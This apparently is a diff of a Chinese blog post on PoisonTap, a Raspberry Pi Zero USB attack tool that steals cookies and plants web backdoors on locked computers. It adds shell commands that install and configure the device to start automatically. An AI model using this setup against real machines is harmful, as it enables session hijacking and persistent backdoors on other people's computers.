@@ -33,6 +33,8 @@ PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。
 - 用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商
 - 截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标
 
+![](/content/images/poisontap/2.gif)
+
 PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：
 
 * 锁屏密码
@@ -46,8 +48,42 @@ PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM�
 * 跨域资源共享CORS
 * HTTPS cookie 保护
 
+# 安装
 
-![](/content/images/poisontap/2.gif)
+接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。
+
+注意！配置前请保证`apt-get`命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。
+
+首先，我们在本机下载下来这个神器Poisontap
+
+```bash
+git clone https://github.com/samyk/poisontap
+```
+然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。
+```bash
+scp -r poisontap pi@zero.local:~
+```
+登录到树莓派上，运行
+```bash
+cd poisontap
+echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
+echo "dtoverlay=dwc2" >> /boot/config.txt
+echo -e "dwc2\ng_ether" >> /etc/modules
+sudo sed --in-place "/exit 0/d" /etc/rc.local
+echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local
+mkdir /home/pi/poisontap
+chown -R pi /home/pi/poisontap
+apt-get update && apt-get upgrade
+apt-get -y install isc-dhcp-server dsniff screen nodejs
+```
+确保以上都成功后，运行
+```bash
+sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf
+reboot
+```
+好了，已经安装好了，接下来我们可以Hack啦~
+# Hack
+
 
 # 参考
 https://github.com/samyk/poisontap
